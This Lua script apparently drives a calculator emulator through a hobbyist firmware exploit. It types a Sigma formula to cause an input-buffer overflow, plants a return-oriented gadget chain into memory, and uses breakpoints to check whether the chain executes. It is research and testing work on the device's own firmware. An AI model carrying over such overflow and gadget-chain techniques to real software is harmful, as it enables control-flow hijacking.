-- FINAL RUN: warm-up keys, SETUP open (verified by render), digit-2 select,
-- Sigma bare check, then full formula + overflow + payload + chain pipeline.
dofile("emulator/lua-common.lua")
io.stdout:setvbuf("no")

local T = 0
local SHIFT, ALPHA, MODE, CALC, EXE, AC, DEL, LEFT, DOWN, K1, K2, K9, KX10 =
	0x07, 0x17, 0x47, 0x06, 0x60, 0x42, 0x32, 0x26, 0x36, 0x00, 0x10, 0x22, 0x62
local PAY_IN = 0x8154

local keys, ki = {}, 0
local state, hold_t, gap_t, cur = "idle", 0, 0, nil
local phase, final_t, snap = "type", 0, {}
local scan_hits, store_caps = 0, 0
local lineio = false

local function blen()
	for i = 0, 99 do if (data[0x8154 + i] or 0) == 0 then return i end end
	return 100
end
local function bdump(n)
	local s = ""
	for i = 0, (n or 32) - 1 do s = s .. string.format("%02X", data[0x8154 + i] or 0) end
	return s
end
local function push(code, label, expect, hold, gap)
	keys[#keys + 1] = { code = code, label = label, expect = expect, hold = hold or 16000, gap = gap or 20000 }
end
local function render(tag) keys[#keys + 1] = { render = tag } end
local function render_screen(tag)
	print("SCREEN: ---- " .. tag .. " ----")
	for r = 0, 24 do
		local line = ""
		for b = 0, 11 do
			local v = data[0xF800 + r * 16 + b] or 0
			for bit = 7, 0, -1 do line = line .. (((v >> bit) & 1) == 1 and "#" or ".") end
		end
		print("SCREEN: " .. line)
	end
end
local function chord(mod, code, label, expect)
	push(mod, label .. "/mod", nil, 16000, 16000)
	push(code, label, expect, 16000, 16000)
end

-- warm-up (keys here may be eaten by boot; harmless)
push(SHIFT, "w1", nil, 12000, 12000); push(AC, "w2", nil, 12000, 24000)
-- SETUP open + digit-2 (page-1 select LineIO)
chord(SHIFT, MODE, "setup1")
render("setup1")
push(K2, "setup1-digit2", nil, 30000, 40000)
render("setup1 after 2")
-- verify: Sigma must be bare (exactly 2 bytes 69 B8)
chord(SHIFT, 0x56, "sigma-verify")
-- if boxed: one more open+2 pass
chord(SHIFT, MODE, "setup2")
push(K2, "setup2-digit2", nil, 30000, 40000)
render("setup2 after 2")
chord(SHIFT, 0x56, "sigma-verify2")
push(AC, "AC-clear", nil, 16000, 24000)
-- ====== formula: X = Σ(X,1,1×10^9 ======
chord(ALPHA, 0x33, "X1", { { 0x58 } })
chord(ALPHA, CALC, "eq", { { 0x3D } })
chord(SHIFT, 0x56, "Sigma", { { 0x69, 0xB8 } })
chord(ALPHA, 0x33, "X2", { { 0x58 } })
chord(SHIFT, 0x33, "comma1", { { 0x2C } })
push(K1, "one", { { 0x31 } })
chord(SHIFT, 0x33, "comma2", { { 0x2C } })
push(K1, "one2", { { 0x31 } })
push(KX10, "x10", { { 0x74 } })
push(K9, "nine", { { 0x39 } })
render("formula typed")
-- ====== calc = ac <- ======
push(CALC, "CALC", nil, 16000, 24000)
push(EXE, "EXE", nil, 24000, 30000)
push(AC, "AC", nil, 16000, 24000)
push(LEFT, "LEFT", nil, 16000, 16000)
-- ====== del del del 2 ======
push(DEL, "DEL1", nil, 16000, 12000)
push(DEL, "DEL2", nil, 16000, 12000)
push(DEL, "DEL3", nil, 16000, 12000)
push(K2, "two", { { 0x32 } })
-- ====== calc = <- ======
push(CALC, "CALC2", nil, 16000, 24000)
push(EXE, "EXE2", nil, 24000, 30000)
push(LEFT, "LEFT2", nil, 16000, 20000)
-- ====== probe: 1 must not insert ======
push(K1, "PROBE1", nil, 16000, 16000)

function finish(tag)
	print(string.format("PROTO: %s hits=%d pc=%04X sp=%04X", tag, scan_hits, cpu.pc, cpu.sp))
	print("PROTO: final-buf " .. bdump(48) .. " len=" .. blen())
	Keyboard:ReleaseAll()
	emu:set_paused(true)
	phase = "done"
end

-- unique pattern (harness-planted) at 0x8C74
local uniq={0xDE,0xAD,0xBE,0xEF,0x12,0x34,0x56,0x78,0x9A,0xBC,0xDE,0xF0}
for i=1,#uniq do data[0x8C70+i]=uniq[i] end
be35_hits, be35_mine = 0, 0
break_at(0x4D20, function()
	scan_hits = scan_hits + 1
	local w = {}
	for i = -8, 7, 2 do w[#w+1] = string.format("%04X", data[cpu.sp + i] | (data[cpu.sp + i + 1] << 8)) end
	print(string.format("CHAIN: KEYSCAN #%d ER0=%04X sp=%04X words[sp-8..sp+7]=%s", scan_hits,
		(cpu.r1 & 0xFF) * 0x100 + (cpu.r0 & 0xFF), cpu.sp, table.concat(w, " ")))
	emu:set_paused(false)
end)
local h38 = 0
break_at(0x3538, function()
	h38 = h38 + 1
	if h38 <= 4 or (cpu.sp >= 0x8D50 and cpu.sp <= 0x8DC0) then
		print(string.format("HIT-3538 #%d: sp=%04X ER2=%04X lr=%04X", h38, cpu.sp,
			(cpu.r3 & 0xFF) * 0x100 + (cpu.r2 & 0xFF), cpu.lr))
	end
	emu:set_paused(false)
end)
be35_hits, be35_mine = be35_hits or 0, be35_mine or 0
break_at(0x35BE, function()
	be35_hits = be35_hits + 1
	local er2 = (cpu.r3 & 0xFF) * 0x100 + (cpu.r2 & 0xFF)
	if er2 == 0xF801 then
		be35_mine = be35_mine + 1
		local d={}
		for i=0,11 do d[#d+1]=string.format("%02X", data[0xF810+i]) end
		print(string.format("HIT-35BE(mine) #%d: sp=%04X ER2=%04X EA=%04X r0=%02X lr=%04X pre-F810=%s", be35_mine, cpu.sp, er2, cpu.ea, cpu.r0 & 0xFF, cpu.lr, table.concat(d)))
	end
	emu:set_paused(false)
end)
-- filtered store-capture: fire at 0x35CC (post-ST) only when ER2 in [0xF800..0xF8FF]
break_at(0x35CC, function()
	local er2 = (cpu.r3 & 0xFF) * 0x100 + (cpu.r2 & 0xFF)
	if er2 >= 0xF800 and er2 <= 0xF8FF then
		local d = {}
		for i = 0, 15 do d[#d+1] = string.format("%02X", data[0xF800 + i]) end
		local d1 = {}
		for i = 0, 11 do d1[#d1+1] = string.format("%02X", data[0xF810 + i]) end
		if store_caps < 4 then
			print(string.format("STORE-CAPTURE: sp=%04X ER2=%04X r0=%02X EA=%04X row0=%s row1=%s", cpu.sp, er2, cpu.r0 & 0xFF, cpu.ea, table.concat(d), table.concat(d1)))
			store_caps = store_caps + 1
		end
	end
	emu:set_paused(false)
end)

local len_before_probe = nil

addposttick(function()
	T = T + 1

	if phase == "type" then
		if state == "idle" then
			ki = ki + 1
			if ki > #keys then
				phase = "final"
				print("INPUT: typing done len=" .. blen() .. " buf=" .. bdump(48))
				return
			end
			cur = keys[ki]
			if cur.code then
				Keyboard:PressKey(cur.code)
				state = "press"; hold_t = cur.hold
			else
				render_screen(cur.render)
			end
		elseif state == "press" then
			hold_t = hold_t - 1
			if hold_t <= 0 then
				Keyboard:ReleaseAll()
				state = "rel"; gap_t = cur.gap
			end
		elseif state == "rel" then
			gap_t = gap_t - 1
			if gap_t <= 0 then
				local lb = cur.label
				if lb == "sigma-verify" or lb == "sigma-verify2" then
					local n = blen()
					local bare = n >= 2 and (data[0x8154 + n - 2] == 0x69) and (data[0x8154 + n - 1] == 0xB8)
					local boxed = false
					for i = 0, 97 do
						if (data[0x8154 + i] or 0) == 0x21 and (data[0x8154 + i + 1] or 0) == 0xBA then boxed = true; break end
					end
					print(string.format("SIGMA: %s len=%d bare=%s boxed=%s", lb, n, tostring(bare), tostring(boxed)))
					if bare and not boxed then lineio = true end
				elseif lb == "setup1" or lb == "setup1 after 2" or lb == "setup2 after 2" or lb == "formula typed" then
					render_screen(lb)
				elseif lb == "PROBE1" then
					len_before_probe = len_before_probe or blen()
					print(string.format("PROBE1: before=%d after=%d %s", len_before_probe, blen(),
						blen() > len_before_probe and "GREW(bad)" or "NOT-INSERTED(good)"))
				end
				state = "idle"
			end
		end

	elseif phase == "final" then
		final_t = final_t + 1
		if final_t == 1 then
			for a = 0x8100, 0x8E7F do snap[a] = (data[a] or 0) & 0xFF end
			Keyboard:PressKey(0x37)   -- Right held: KEYSCAN sets r0=1 (single memcpy iteration)
			Keyboard:PressKey(AC)
		elseif final_t == 16001 then
			Keyboard:ReleaseAll()
		elseif final_t == 20001 then
			Keyboard:PressKey(LEFT)
		elseif final_t == 36001 then
			Keyboard:ReleaseAll()
			for e = 0, 49 do
				data[PAY_IN + e * 2] = 0x0E
				data[PAY_IN + e * 2 + 1] = 0x4D
			end
			local function W(off, v) data[PAY_IN + off] = v & 0xFF; data[PAY_IN + off + 1] = (v >> 8) & 0xFF end
			W(60, 0x3538); W(62, 0x3538)   -- doubled: POP ER2;POP LR;RT gadget
			W(64, 0xF801)                   -- ER2 = 0xF801: writes align to row 0; gadget's MOV ER0,ER2 leaves r0=1
			W(66, 0x35BE)                   -- LR = memcpy12; RT jumps there
			W(68, 0x8154)                   -- memcpy's POP EA: src = our own tile pattern
			-- 70..83 = memcpy tail sacrifice (0E4D); 84..99 = pad
			print("INPUT: payload-v5 in, len=" .. blen())
			print("INPUT: (payload-v2 above)")
		elseif final_t == 40001 then
			Keyboard:PressKey(0x60)
		elseif final_t == 60001 then
			Keyboard:ReleaseAll()
			emu:SetClockSpeed(16)
			print("WATCH: 16x")
		elseif final_t > 60001 then
			if (final_t - 60001) % 100000 == 0 then
				local tiled = 0
				for a = 0x8240, 0x8DF8 do
					if (data[a] or 0) == 0x4D and (data[a - 1] or 0) == 0x0E then tiled = tiled + 1 end
				end
				local rs = {}
				for rr = 0, 5 do
					local s2 = ""
					for i = 0, 11 do s2 = s2 .. string.format("%02X", data[0xF800 + rr * 16 + i]) end
					rs[rr + 1] = s2
				end
				print(string.format("WATCH: t=%d pc=%04X sp=%04X tiles=%d hits=%d rows=%s|%s|%s|%s|%s|%s", final_t, cpu.pc, cpu.sp, tiled, scan_hits, rs[1], rs[2], rs[3], rs[4], rs[5], rs[6]))
			end
			if scan_hits >= 50 then finish("TRIGGERED-CHAIN-RUNS") elseif final_t > 6000000 then finish("NO-TRIGGER") end
		end
	end
end)
